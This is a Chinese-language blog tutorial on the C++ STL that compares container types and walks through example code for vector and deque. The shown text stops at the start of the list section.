<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>C&#43;&#43; - STL标准库 - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="C&#43;&#43; - STL标准库" />
<meta property="og:description" content="1.C&#43;&#43; STL标准库简介
长久以来，软件界一直希望建立一种可重复利用的东西，以及一种得以制造出”可重复运用的东西”
的方法，从函数(functions)，类别(classes),函数库(function libraries),类别库(class libraries)、各种
组件，从模块化设计，到面向对象(object oriented )，为的就是复用性的提升。
复用性必须建立在某种标准之上。但是在许多环境下，就连软件开发最基本的数据结构(data
structures) 和算法(algorithm)都未能有一套标准。大量程序员被迫从事大量重复的工作，竟然是为
了完成前人已经完成而自己手上并未拥有的程序代码，这不仅是人力资源的浪费，也是挫折与痛苦
的来源。
为了建立数据结构和算法的一套标准，并且降低他们之间的耦合关系，以提升各自的独立性、弹
性、交互操作性(相互合作性,interoperability),诞生了STL。
STL(Standard Template Library,标准模板库)，是惠普实验室开发的一系列软件的统称。现在主要
出现在 c&#43;&#43;中，但是在引入 c&#43;&#43;之前该技术已经存在很长时间了。
STL 从广义上分为: 容器(container) 算法(algorithm) 迭代器(iterator)。
容器和算法之间通过迭代器进行无缝连接。STL 几乎所有的代码都采用了模板类或者模板函数，这
相比传统的由函数和类组成的库来说提供了更好的代码重用机会。
STL(Standard Template Library)标准模板库,在我们 c&#43;&#43;标准程序库中隶属于 STL 的占到了 80%以
上。
2.STL容器使用时机
.vectordequelistsetmultisetmapmultimap典型内存结构单端数组双端数组双向链表二叉树二叉树二叉树二叉树可随机存取是是否否否对key而言：不是否元素搜寻速度慢慢非常慢快快对key而言：快对key而言：快元素安插移除尾端头尾两端任何位置---- vector的使用场景：比如软件历史操作记录的存储，我们经常要查看历史记录，比如上一次的记
录，上上次的记录，但却不会去删除记录，因为记录是事实的描述。
deque的使用场景：比如排队购票系统，对排队者的存储可以采用deque，支持头端的快速移除，
尾端的快速添加。如果采用vector，则头端移除时，会移动大量的数据，速度慢。
vector与deque的比较：
一：vector.at()比deque.at()效率高，比如vector.at(0)是固定的，deque的开始位置 却是不固定的。
二：如果有大量释放操作的话，vector花的时间更少，这跟二者的内部实现有关。
三：deque支持头部的快速插入与快速移除，这是deque的优点。
list的使用场景：比如公交车乘客的存储，随时可能有乘客下车，支持频繁的不确实位置元素的移
除插入。
set的使用场景：比如对手机游戏的个人得分记录的存储，存储要求从高分到低分的顺序排列。
map的使用场景：比如按ID号存储十万个用户，想要快速要通过ID查找对应的用户。二叉树的查找
效率，这时就体现出来了。如果是vector容器，最坏的情况下可能要遍历完整个容器才能找到该用
户。
3.vector容器
vector的数据安排以及操作方式，与array非常相似，两者的唯一差别在于空间的运用的灵活性。
Array是静态空间，一旦配置了就不能改变，要换大一点或者小一点的空间，可以，一切琐碎得由
自己来，首先配置一块新的空间，然后将旧空间的数据搬往新空间，再释放原来的空间。
Vector是动态空间，随着元素的加入，它的内部机制会自动扩充空间以容纳新元素。因此vector的
运用对于内存的合理利用与运用的灵活性有很大的帮助，我们再也不必害怕空间不足而一开始就要
求一个大块头的array了。
Vector的实现技术，关键在于其对大小的控制以及重新配置时的数据移动效率，一旦vector旧空间
满了，如果客户每新增一个元素，vector内部只是扩充一个元素的空间，实为不智，因为所谓的扩
充空间(不论多大)，一如刚所说，是”配置新空间-数据移动-释放旧空间”的大工程,时间成本很高，
应该加入某种未雨绸缪的考虑，稍后我们便可以看到vector的空间配置策略。
基本使用：
#include &#34;stdafx.h&#34; #include &lt;iostream&gt; #include &lt;vector&gt;//动态数组 using namespace std; int main() { vector&lt;int&gt; v1;//构造一个空的vector cout &lt;&lt; &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bchobby.github.io/posts/fb8d9e8ae7596116e9c956affce69a39/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-09-04T18:36:05+08:00" />
<meta property="article:modified_time" content="2022-09-04T18:36:05+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">C&#43;&#43; - STL标准库</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p><strong>1.C++ STL标准库简介</strong></p> 
<p>长久以来，软件界一直希望建立一种可重复利用的东西，以及一种得以制造出”可重复运用的东西”</p> 
<p>的方法，从函数(functions)，类别(classes),函数库(function libraries),类别库(class libraries)、各种</p> 
<p>组件，从模块化设计，到面向对象(object oriented )，为的就是复用性的提升。</p> 
<p>复用性必须建立在某种标准之上。但是在许多环境下，就连软件开发最基本的数据结构(data</p> 
<p>structures) 和算法(algorithm)都未能有一套标准。大量程序员被迫从事大量重复的工作，竟然是为</p> 
<p>了完成前人已经完成而自己手上并未拥有的程序代码，这不仅是人力资源的浪费，也是挫折与痛苦</p> 
<p>的来源。</p> 
<p>为了建立数据结构和算法的一套标准，并且降低他们之间的耦合关系，以提升各自的独立性、弹</p> 
<p>性、交互操作性(相互合作性,interoperability),诞生了STL。</p> 
<p>STL(Standard Template Library,标准模板库)，是惠普实验室开发的一系列软件的统称。现在主要</p> 
<p>出现在 c++中，但是在引入 c++之前该技术已经存在很长时间了。</p> 
<p>STL 从广义上分为: 容器(container) 算法(algorithm) 迭代器(iterator)。</p> 
<p>容器和算法之间通过迭代器进行无缝连接。STL 几乎所有的代码都采用了模板类或者模板函数，这</p> 
<p>相比传统的由函数和类组成的库来说提供了更好的代码重用机会。</p> 
<p>STL(Standard Template Library)标准模板库,在我们 c++标准程序库中隶属于 STL 的占到了 80%以</p> 
<p>上。</p> 
<p></p> 
<p><strong>2.STL容器使用时机</strong></p> 
<p></p> 
<table><thead><tr><th>.</th><th>vector</th><th>deque</th><th>list</th><th>set</th><th>multiset</th><th>map</th><th>multimap</th></tr></thead><tbody><tr><td>典型内存结构</td><td>单端数组</td><td>双端数组</td><td>双向链表</td><td>二叉树</td><td>二叉树</td><td>二叉树</td><td>二叉树</td></tr><tr><td>可随机存取</td><td>是</td><td>是</td><td>否</td><td>否</td><td>否</td><td>对key而言：不是</td><td>否</td></tr><tr><td>元素搜寻速度</td><td>慢</td><td>慢</td><td>非常慢</td><td>快</td><td>快</td><td>对key而言：快</td><td>对key而言：快</td></tr><tr><td>元素安插移除</td><td>尾端</td><td>头尾两端</td><td>任何位置</td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table> 
<p>vector的使用场景：比如软件历史操作记录的存储，我们经常要查看历史记录，比如上一次的记</p> 
<p>录，上上次的记录，但却不会去删除记录，因为记录是事实的描述。</p> 
<p>deque的使用场景：比如排队购票系统，对排队者的存储可以采用deque，支持头端的快速移除，</p> 
<p>尾端的快速添加。如果采用vector，则头端移除时，会移动大量的数据，速度慢。</p> 
<p>vector与deque的比较：</p> 
<p>一：vector.at()比deque.at()效率高，比如vector.at(0)是固定的，deque的开始位置 却是不固定的。</p> 
<p>二：如果有大量释放操作的话，vector花的时间更少，这跟二者的内部实现有关。</p> 
<p>三：deque支持头部的快速插入与快速移除，这是deque的优点。</p> 
<p>list的使用场景：比如公交车乘客的存储，随时可能有乘客下车，支持频繁的不确实位置元素的移</p> 
<p>除插入。</p> 
<p>set的使用场景：比如对手机游戏的个人得分记录的存储，存储要求从高分到低分的顺序排列。</p> 
<p>map的使用场景：比如按ID号存储十万个用户，想要快速要通过ID查找对应的用户。二叉树的查找</p> 
<p>效率，这时就体现出来了。如果是vector容器，最坏的情况下可能要遍历完整个容器才能找到该用</p> 
<p>户。<br>  </p> 
<p><strong>3.vector容器</strong></p> 
<p>vector的数据安排以及操作方式，与array非常相似，两者的唯一差别在于空间的运用的灵活性。</p> 
<p>Array是静态空间，一旦配置了就不能改变，要换大一点或者小一点的空间，可以，一切琐碎得由</p> 
<p>自己来，首先配置一块新的空间，然后将旧空间的数据搬往新空间，再释放原来的空间。</p> 
<p>Vector是动态空间，随着元素的加入，它的内部机制会自动扩充空间以容纳新元素。因此vector的</p> 
<p>运用对于内存的合理利用与运用的灵活性有很大的帮助，我们再也不必害怕空间不足而一开始就要</p> 
<p>求一个大块头的array了。</p> 
<p>Vector的实现技术，关键在于其对大小的控制以及重新配置时的数据移动效率，一旦vector旧空间</p> 
<p>满了，如果客户每新增一个元素，vector内部只是扩充一个元素的空间，实为不智，因为所谓的扩</p> 
<p>充空间(不论多大)，一如刚所说，是”配置新空间-数据移动-释放旧空间”的大工程,时间成本很高，</p> 
<p>应该加入某种未雨绸缪的考虑，稍后我们便可以看到vector的空间配置策略。</p> 
<p><img alt="" src="https://images2.imgbox.com/ff/04/OkhnTITA_o.png"></p> 
<p><strong>基本使用：</strong></p> 
<pre><code>#include "stdafx.h"
#include &lt;iostream&gt;

#include &lt;vector&gt;//动态数组
using namespace std;

int main()
{
   vector&lt;int&gt;  v1;//构造一个空的vector
   cout &lt;&lt; "容量为："&lt;&lt;v1.capacity() &lt;&lt; "     元素个数: " &lt;&lt; v1.size() &lt;&lt; endl;

   vector&lt;int&gt;  v2(5);//构造一个空间大小为5，并且元素为5个（有默认值）的vector
   cout &lt;&lt; "容量为：" &lt;&lt; v2.capacity() &lt;&lt; "     元素个数: " &lt;&lt; v2.size() &lt;&lt;"	   v2[0]:"&lt;&lt;v2[0]&lt;&lt; endl;

   vector&lt;int&gt;  v3(5,111);//构造一个空间大小为5，并且元素为5个（每个元素初始值为111）的vector
   cout &lt;&lt; "容量为：" &lt;&lt; v3.capacity() &lt;&lt; "     元素个数: " &lt;&lt; v3.size() &lt;&lt; "	   v3[0]:" &lt;&lt; v3[0] &lt;&lt; endl;

   vector&lt;int&gt;  v4(v3);//拷贝构造vector
   cout &lt;&lt; "容量为：" &lt;&lt; v4.capacity() &lt;&lt; "     元素个数: " &lt;&lt; v4.size() &lt;&lt; "	   v4[0]:" &lt;&lt; v4[0] &lt;&lt; endl;

   //像数组一样的访问vector
   v2[0] = 1;//vector重载了[]运算符
   v2[1] = 2;
   v2[2] = 3;
   v2.at(3) = 4;
   v2.at(4) = 5;

   for (size_t i = 0; i &lt; v2.size(); i++)
   {
   	//cout &lt;&lt; v2[i] &lt;&lt; "	";
   	//cout &lt;&lt; v2.at(i)&lt;&lt; "	";
        cout &lt;&lt; &amp;v2[i] &lt;&lt; "	";//输出地址，说明存储空间是连续的
   }
   cout &lt;&lt; endl;

   return 0;
}
</code></pre> 
<p><strong>迭代器使用：</strong></p> 
<pre><code>#include&lt;iostream&gt;
#include&lt;vector&gt;//动态数组
using namespace std;

template&lt;class T&gt;
void   Print(T  begin, T  end)
{
   //此处编写代码
   for (T p = begin; p != end; ++p)
   {
   	cout &lt;&lt; *p &lt;&lt; "		";
   }
   cout &lt;&lt; endl;
}

int main()
{
   vector&lt;int&gt;  v(5);//构造一个空间大小为5，并且元素为5个（有默认值）的vector

   //像数组一样的访问vector
   v[0] = 1;//vector重载了[]运算符
   v[1] = 2;
   v[2] = 3;
   v.at(3) = 4;
   v.at(4) = 5;

   for (size_t i = 0; i &lt; v.size(); i++)
   {
   	cout &lt;&lt; v[i] &lt;&lt; "	";
   }
   cout &lt;&lt; endl;

   {
   //验证vector的迭代器是随机访问迭代器（支持++  、-- 、 +n、  +=n 、-=n 、 -n 、 *、[]   ）
   //random_access_iterator
   cout &lt;&lt; typeid(vector&lt;int&gt;::iterator::iterator_category).name() &lt;&lt; endl;

   vector&lt;int&gt;::iterator  it = v.begin();//begin返回v的第一个元素的迭代器
   cout &lt;&lt; "v开头的迭代器指向的元素值：" &lt;&lt; *it &lt;&lt; endl;

   ++it;//it的值改变
   cout &lt;&lt; "v第二个的元素值：" &lt;&lt; *it &lt;&lt; endl;

   cout &lt;&lt; "v第四个的元素值：" &lt;&lt; *(it + 2) &lt;&lt; endl;//此刻这里的it还是指向第二个，没变

   it -= 1;//it的值改变
   cout &lt;&lt; "v第一个的元素值：" &lt;&lt; *it &lt;&lt; endl;

   cout &lt;&lt; "v第五个的元素值：" &lt;&lt; it[4] &lt;&lt; endl;//这里的it没变
}
   //可以改变指向元素的值
   vector&lt;int&gt;::iterator  it = v.begin();
   *it = 111;

   //使用迭代器遍历元素
   for (vector&lt;int&gt;::iterator  it = v.begin() ;   it!=v.end(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "	";
   }
   cout &lt;&lt; endl;

   //常迭代器  指向的元素值不可改变,  类似  const int  *p; 
   vector&lt;int&gt;::const_iterator   it2 = v.cbegin();
   //*it2 = 111;

   //反向迭代器
   for (vector&lt;int&gt;::reverse_iterator  it3 = v.rbegin(); it3 != v.rend(); it3++)
   {
   	cout &lt;&lt; *it3 &lt;&lt; "	";
   }
   cout &lt;&lt; endl;

   //测试我们自己实现的Print算法,迭代器架起了 算法与容器之间的桥梁
   Print&lt;vector&lt;int&gt;::iterator&gt;(v.begin(), v.end());
   Print(v.begin(), v.end());
   Print&lt;vector&lt;int&gt;::reverse_iterator&gt;(v.rbegin(), v.rend());

   return 0;
}
</code></pre> 
<p><strong>添加、删除、插入元素：</strong></p> 
<pre><code>#include&lt;iostream&gt;
#include&lt;vector&gt;
using namespace  std;

int main()
{
   vector&lt;int &gt;   v;//定义一个空的动态数组
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   //往尾部插入元素   //    1
   v.push_back(1);
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;
    
   v.push_back(2);     //      1  2 
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   //向某一个迭代器指向的位置插入
   v.insert(v.begin(), 3);//    3  1   2
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   //向某一个迭代器指向的位置插入2个值为4的元素
   v.insert(v.end()-1 ,  2, 4);//    3  1      4  4  2
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   //使用迭代器遍历
   for (vector&lt;int &gt;::const_iterator   it =  v.cbegin();   it!=  v.cend(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   //访问第一个元素
   cout &lt;&lt;"front		" &lt;&lt;v.front() &lt;&lt; endl;
   //访问最后一个元素
   cout &lt;&lt; "back		" &lt;&lt; v.back() &lt;&lt; endl;
   //访问某一个下标的元素
   cout &lt;&lt; "at			" &lt;&lt; v.at(3) &lt;&lt; endl;

   //删除最后一个元素
   v.pop_back();
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   //删除开头的元素
   v.erase(v.begin());
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   //删除结尾的元素, end()指向最后一个元素的下一个
   v.erase(v.end()-1);
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   //使用迭代器遍历
   for (vector&lt;int &gt;::const_iterator it = v.cbegin(); it != v.cend(); it++)
   {
   	cout &lt;&lt; *it &lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   //删除所有元素，不会清除容量
   v.clear();
   cout &lt;&lt; "容量:" &lt;&lt; v.capacity() &lt;&lt; "		元素个数:" &lt;&lt; v.size() &lt;&lt; endl;

   /*
   当size和capacity相等时继续添加数据，否则vector会扩容，
   每次扩容都是增加当前空间的1/2(第一次除外);
   */
   {
   	vector&lt;int&gt;  v;

   	cout &lt;&lt; "------------------------capacity容量随元素个数size增加的规律----------------------------" &lt;&lt; endl;
   	for (int i = 0; i &lt; 50; i++)
   	{
   		v.push_back(i);
   		cout &lt;&lt; "v的容量：" &lt;&lt; v.capacity() &lt;&lt; "  元素个数:" &lt;&lt; v.size() &lt;&lt; endl;
   	}
   }

   return 0;
}
</code></pre> 
<p> <strong>vector常用赋值操作：</strong></p> 
<pre><code>assign(beg, end);//将[beg, end)区间中的数据拷贝赋值给本身。
assign(n, elem);//将n个elem拷贝赋值给本身。
vector&amp; operator=(const vector  &amp;vec);//重载等号操作符
swap(vec);// 将vec与本身的元素互换。
</code></pre> 
<p><strong>vector大小操作:</strong></p> 
<pre><code>size();//返回容器中元素的个数
empty();//判断容器是否为空
resize(int num);//重新指定容器的长度为num，若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。
resize(int num, elem);//重新指定容器的长度为num，若容器变长，则以elem值填充新位置。如果容器变短，则末尾超出容器长&gt;度的元素被删除。
capacity();//容器的容量
reserve(int len);//容器预留len个元素长度，预留位置不初始化，元素不可访问。
</code></pre> 
<p><strong>vector数据存取操作:</strong></p> 
<pre><code>at(int idx); //返回索引idx所指的数据，如果idx越界，抛出out_of_range异常。
operator[];//返回索引idx所指的数据，越界时，运行直接报错
front();//返回容器中第一个数据元素
back();//返回容器中最后一个数据元素
</code></pre> 
<p><strong>vector插入和删除操作:</strong></p> 
<pre><code>insert(const_iterator pos, int count,ele);//迭代器指向位置pos插入count个元素ele.
push_back(ele); //尾部插入元素ele
pop_back();//删除最后一个元素
erase(const_iterator start, const_iterator end);//删除迭代器从start到end之间的元素
erase(const_iterator pos);//删除迭代器指向的元素
clear();//删除容器中所有元素
</code></pre> 
<p><strong>vector排序：</strong></p> 
<pre><code class="hljs">sort(nums.begin(),nums.end());</code></pre> 
<p><strong>定义二维vector：</strong></p> 
<pre><code class="hljs">vector&lt;vector&lt;int&gt;&gt; v;</code></pre> 
<p><strong>创建m*n的二维vector：</strong></p> 
<pre><code class="hljs">vector&lt;vector &lt;int&gt; &gt;nums(m ,vector&lt;int&gt;(n)); //m*n的二维vector</code></pre> 
<p><strong>初始化二维数组：</strong></p> 
<pre><code class="hljs">vector&lt;vector&lt;int&gt;&gt; nums(m ,vector&lt;int&gt;(n,0)); //m*n的二维vector，所有元素为0
</code></pre> 
<p><strong>二维数组遍历：</strong></p> 
<pre><code class="hljs">int m = nums.size(),n = nums[0].size();
for(int i = 0; i &lt; m; i++){
    for(int j = 0; j &lt; n; j++){
        cout&lt;&lt;nums[i][j]&lt;&lt;endl;
    }
}
</code></pre> 
<p><strong>4.deque容器</strong></p> 
<p>Vector容器是单向开口的连续内存空间，deque则是一种双向开口的连续线性空间。</p> 
<p>所谓的双向开口，意思是可以在头尾两端分别做元素的插入和删除操作，当然，vector容器也可以</p> 
<p>在头尾两端插入元素，但是在其头部操作效率奇差，无法被接受。</p> 
<p><img alt="在这里插入图片描述" src="https://images2.imgbox.com/2a/ba/Qiqt5rrF_o.png"></p> 
<p><strong>deque容器实现原理:</strong></p> 
<p>Deque容器是连续的空间，至少逻辑上看来如此，连续现行空间总是令我们联想到array和</p> 
<p>vector,array无法成长，vector虽可成长，却只能向尾端成长，而且其成长其实是一个假象，事实上</p> 
<p>(1) 申请更大空间 (2)原数据复制新空间 (3)释放原空间 三步骤，如果不是vector每次配置新的空间</p> 
<p>时都留有余裕，其成长假象所带来的代价是非常昂贵的。</p> 
<p>Deque是由一段一段的定量的连续空间构成。一旦有必要在deque前端或者尾端增加新的空间，便</p> 
<p>配置一段连续定量的空间，串接在deque的头端或者尾端。Deque最大的工作就是维护这些分段连</p> 
<p>续的内存空间的整体性的假象，并提供随机存取的接口，避开了重新配置空间，复制，释放的轮</p> 
<p>回，代价就是复杂的迭代器架构。</p> 
<p>既然deque是分段连续内存空间，那么就必须有中央控制，维持整体连续的假象，数据结构的设计</p> 
<p>及迭代器的前进后退操作颇为繁琐。Deque代码的实现远比vector或list都多得多。</p> 
<p>Deque采取一块所谓的map(注意，不是STL的map容器)作为主控，这里所谓的map是一小块连续</p> 
<p>的内存空间，其中每一个元素(此处成为一个结点)都是一个指针，指向另一段连续性内存空间，称</p> 
<p>作缓冲区。缓冲区才是deque的存储空间的主体。</p> 
<p><img alt="在这里插入图片描述" src="https://images2.imgbox.com/9e/b9/jm7ejnDr_o.png"></p> 
<p><strong>基本使用 :</strong></p> 
<pre><code>#include&lt;iostream&gt;

#include&lt;deque&gt;
using namespace  std;

int main()
{
   //空的双端队列
   deque&lt;int&gt; d;
   cout &lt;&lt; "元素个数" &lt;&lt; d.size() &lt;&lt; endl;

   deque&lt;int&gt; d2(5);//指定元素个数，默认值为类型默认值
   cout &lt;&lt; "元素个数" &lt;&lt; d2.size() &lt;&lt;"   "&lt;&lt;d2[0]&lt;&lt; endl;

   deque&lt;int&gt; d3(5,111);//指定元素个数，每一个指定元素值111
   cout &lt;&lt; "元素个数" &lt;&lt; d3.size() &lt;&lt; "   " &lt;&lt; d3[4] &lt;&lt; endl;

   deque&lt;int&gt;  d4(d3);//拷贝构造
   cout &lt;&lt; "元素个数" &lt;&lt; d4.size() &lt;&lt; "   " &lt;&lt; d4[3] &lt;&lt; endl;

   //像数组一样的访问元素（内存空间并不是连续的）
   d2[0] = 1;
   d2[1] = 2;
   d2[2] = 3;
   d2.at(3) = 4;

   for (size_t i = 0; i &lt; d2.size(); i++)
   {
   	cout &lt;&lt; d2[i] &lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   //验证deque的内存空间不是连续的
   {
   	deque&lt;int&gt;  d;

   	for (size_t i = 0; i &lt; 20; i++)
   	{
   		d.push_back(i);
   		cout &lt;&lt; "元素" &lt;&lt; d[i] &lt;&lt; " " &lt;&lt; &amp;d[i] &lt;&lt; '\t';

   		if ((i + 1) % 4 == 0)cout &lt;&lt; endl;
   	} 
   	cout &lt;&lt; endl; 
   }

   return 0;
}
</code></pre> 
<p><strong> 迭代器使用：</strong></p> 
<pre><code>#include&lt;iostream&gt;

#include&lt;deque&gt;
using namespace  std;

template&lt;class T&gt;
void   Print(T  begin, T  end)
{
   for (T p = begin; p != end; ++p)
   {
   	cout &lt;&lt; *p &lt;&lt; "		";
   }
   cout &lt;&lt; endl;
}

int main()
{
   deque&lt;int&gt; d2(5);//指定元素个数，默认值为类型默认值
   cout &lt;&lt; "元素个数" &lt;&lt; d2.size() &lt;&lt; "   " &lt;&lt; d2[0] &lt;&lt; endl;

   //像数组一样的访问元素（内存空间并不是连续的）
   d2[0] = 1;
   d2[1] = 2;
   d2[2] = 3;
   d2.at(3) = 4;
   d2.at(4) = 5;
   for (size_t i = 0; i &lt; d2.size(); i++)
   {
   	cout &lt;&lt; d2[i] &lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   //deque&lt;int&gt;::iterator是随机访问迭代器
   cout &lt;&lt; typeid( deque&lt;int&gt;::iterator::iterator_category ).name() &lt;&lt; endl;

   //支持++ 、--、+=n、 -=n、[]、* 、+n、-n
   
   deque&lt;int&gt;::iterator  it = d2.begin();//获取指向容器的第一个元素的迭代器
   cout &lt;&lt; "begin返回的迭代器指向的元素："&lt;&lt;*it &lt;&lt; endl;

   *it = 111;//deque&lt;int&gt;::iterator可以改变迭代器指向的元素值

   it++;//下一个元素，it自身改变
   cout &lt;&lt;"++后:"&lt;&lt; *it &lt;&lt; endl;

   it += 2;//往后移2个位置，it自身改变，指向第4个元素
   cout &lt;&lt; "+=2后:" &lt;&lt; *it &lt;&lt; endl;

   cout &lt;&lt; "-3后:" &lt;&lt; *(it-3) &lt;&lt; endl; //  it-3代表it位置的前3个位置，it自身不变

   cout &lt;&lt; "[1]后:" &lt;&lt; it[1] &lt;&lt; endl; //指向最后一个

   it = d2.begin();//置为开头
   cout &lt;&lt; "[i]后:" &lt;&lt; it[1] &lt;&lt; endl; //指向第二个

   //const_iterator只读的迭代器
   deque&lt;int&gt;::const_iterator   it2 = d2.cbegin();
   //*it2 = 11111; //无法改变元素的值，只能读取，类似于 const int  *

   //使用迭代器正向遍历
   for (deque&lt;int&gt;::iterator it = d2.begin(); it !=  d2.end(); ++it)
   {
   	cout &lt;&lt; *it &lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   //使用反向迭代器反向向遍历
   for (deque&lt;int&gt;::reverse_iterator it = d2.rbegin(); it != d2.rend(); ++it)
   {
   	cout &lt;&lt; *it &lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   //测试自己写的算法(无需知道deque容器的内存结构，具有通用性)
   Print&lt;deque&lt;int&gt;::iterator&gt;(d2.begin(), d2.end());
   Print(d2.rbegin(), d2.rend());//自动推导 

   return 0;
}
</code></pre> 
<p><strong>添加、删除、插入元素：</strong></p> 
<pre><code>#include&lt;iostream&gt;

#include&lt;deque&gt;
using namespace  std;

int main()
{
   deque&lt;int&gt;  d;

   d.push_back(1);//从尾部插入元素
   d.push_front(2);//从头部插入元素（vector没有此方法）
   d.insert(d.begin(), 3);//在迭代器位置插入
   d.insert(d.end(), 2, 4);//在迭代器位置插入2个元素值为4

   for ( int  i = 0; i &lt; d.size(); i++)
   {
   	cout &lt;&lt;d[i]&lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   //访问元素
   //d.at(0) = 111;
   //d[4] = 555;
   cout &lt;&lt; d.front() &lt;&lt; endl;//返回第一个元素
   cout &lt;&lt; d.back() &lt;&lt; endl;//返回第一个元素

   //删除元素
   d.pop_back();//从尾部删除
   d.pop_front();//从头部删除（vector不提供）

   d.erase(d.begin());//删除某个迭代器指向的元素

   for (int i = 0; i &lt; d.size(); i++)
   {
   	cout &lt;&lt; d[i] &lt;&lt; "		";
   }
   cout &lt;&lt; endl;

   d.clear();//全部清空

   cout &lt;&lt; "元素个数："&lt;&lt;d.size() &lt;&lt; endl;

   return 0;
}
</code></pre> 
<p><strong>deque赋值操作：</strong></p> 
<pre><code>assign(beg, end);//将[beg, end)区间中的数据拷贝赋值给本身。
assign(n, elem);//将n个elem拷贝赋值给本身。
deque&amp; operator=(const deque &amp;deq); //重载等号操作符 
swap(deq);// 将deq与本身的元素互换
</code></pre> 
<p><strong>deque大小操作：</strong></p> 
<pre><code>deque.size();//返回容器中元素的个数
deque.empty();//判断容器是否为空
deque.resize(num);//重新指定容器的长度为num,若容器变长，则以默认值填充新位置。如果容器变短，则末尾超出容器长度的元素被删除。
deque.resize(num, elem); //重新指定容器的长度为num,若容器变长，则以elem值填充新位置,如果容器变短，则末尾超出容器长度的元素被删除。
</code></pre> 
<p><strong>deque双端插入和删除操作：</strong></p> 
<pre><code>push_back(elem);//在容器尾部添加一个数据
push_front(elem);//在容器头部插入一个数据
pop_back();//删除容器最后一个数据
pop_front();//删除容器第一个数据
</code></pre> 
<p><strong>deque数据存取：</strong></p> 
<pre><code>at(idx);//返回索引idx所指的数据，如果idx越界，抛出out_of_range。
operator[];//返回索引idx所指的数据，如果idx越界，不抛出异常，直接出错。
front();//返回第一个数据。
back();//返回最后一个数据
</code></pre> 
<p><strong>deque插入操作：</strong></p> 
<pre><code>insert(pos,elem);//在pos位置插入一个elem元素的拷贝，返回新数据的位置。
insert(pos,n,elem);//在pos位置插入n个elem数据，无返回值。
insert(pos,beg,end);//在pos位置插入[beg,end)区间的数据，无返回值。
</code></pre> 
<p><strong>deque删除操作：</strong></p> 
<pre><code>clear();//移除容器的所有数据
erase(beg,end);//删除[beg,end)区间的数据，返回下一个数据的位置。
erase(pos);//删除pos位置的数据，返回下一个数据的位置。
</code></pre> 
<p></p> 
<p><strong>5.list容器</strong></p> 
<p>链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针</p> 
<p>链接次序实现的。</p> 
<p>链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包</p> 
<p>括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。</p> 
<p>相较于vector的连续线性空间，list就显得负责许多，它的好处是每次插入或者删除一个元素，就是</p> 
<p>配置或者释放一个元素的空间。因此，list对于空间的运用有绝对的精准，一点也不浪费。而且，</p> 
<p>对于任何位置的元素插入或元素的移除，list永远是常数时间。</p> 
<p>List和vector是两个最常被使用的容器。</p> 
<p>List容器是一个双向链表。</p> 
<p><img alt="在这里插入图片描述" src="https://images2.imgbox.com/49/7d/HTYbDFJI_o.png"></p> 
<ul><li>采用动态存储分配，不会造成内存浪费和溢出</li><li>链表执行插入和删除操作十分方便，修改指针即可，不需要移动大量元素</li><li>链表灵活，但是空间和时间额外耗费较大</li></ul> 
<p><strong>基本使用:</strong></p> 
<pre><code>#include&lt;iostream&gt;

#include&lt;list&gt;
using namespace std;

int main()
{
   list&lt;int&gt; l;//空的双向链表
   cout &lt;&lt; "元素个数:" &lt;&lt; l.size() &lt;&lt; endl;

   list&lt;int&gt; l2(5);//初始化5个元素，默认值为类型的默认值
   cout &lt;&lt; "元素个数:" &lt;&lt; l2.size() &lt;&lt;"  "&lt;&lt;  * (l2.begin() )&lt;&lt; endl;

